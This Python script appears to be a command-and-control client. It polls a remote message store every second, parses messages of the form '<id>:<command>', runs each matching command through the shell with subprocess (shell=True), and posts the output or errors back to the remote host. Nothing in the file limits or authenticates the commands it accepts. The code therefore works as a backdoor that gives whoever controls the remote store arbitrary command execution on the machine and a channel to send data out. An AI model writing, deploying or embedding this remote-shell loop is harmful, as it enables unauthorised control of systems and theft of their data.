import utils.api.v0.db as db
import subprocess
import time
import json
import datetime
import traceback
from settings import DOMEN, DATA


def get_info_by_command(command: str) -> int:
    id: int = int(command.strip().split(":")[0].strip("<>"))
    command: str = command.strip().split(":")[1].strip("<>")
    return id, command


def commnad_run(command: str, debug: bool = True) -> None:
    try:
        result: str = subprocess.check_output(command, shell=True, text=True)
    except subprocess.CalledProcessError as error:
        message = f"\033[31mInternal server error\033[0m {error}"
        db.receive_a_new_message(DOMEN, data={**DATA, "msg": message})
        print(message)
        return

    print("Recieving data...")
    db.receive_a_new_message(DOMEN, data={**DATA, "msg": result})
    print("""Complete with status ^
                     |""")
    if debug:
        print(datetime.datetime.now())


def main(debug: bool = True) -> None:
    print("Initialization...")
    id = 1
    print(f"My id {id}")
    delay = 1.0  # float(input('Delay (in seconds): '))
    database = db.get_db(DOMEN, data={**DATA}, debug=debug)
    if debug:
        print(datetime.datetime.now())
    print("Starting...")

    run = True
    while run:
        time.sleep(delay)
        new_db_original = db.get_db(DOMEN, data={**DATA}, debug=debug)
        if debug:
            print(datetime.datetime.now())
        if database != new_db_original:
            new_db = new_db_original.splitlines()
            new_db = new_db[len(new_db) - 1]
            command = json.loads(new_db)["msg"]
            print(f"Command: \033[34m[\033[0m{command}\033[34m]\033[0m")

            try:
                info = get_info_by_command(command)
                if info[0] == id:
                    print("Run command")
                    commnad_run(info[1])
            except ValueError as error:
                print("\n".join(traceback.format_exception(error)))
            except IndexError as error:
                print("\n".join(traceback.format_exception(error)))

            database = db.get_db(DOMEN, data={**DATA}, debug=debug)
            if debug:
                print(datetime.datetime.now())


if __name__ == "__main__":
    main()
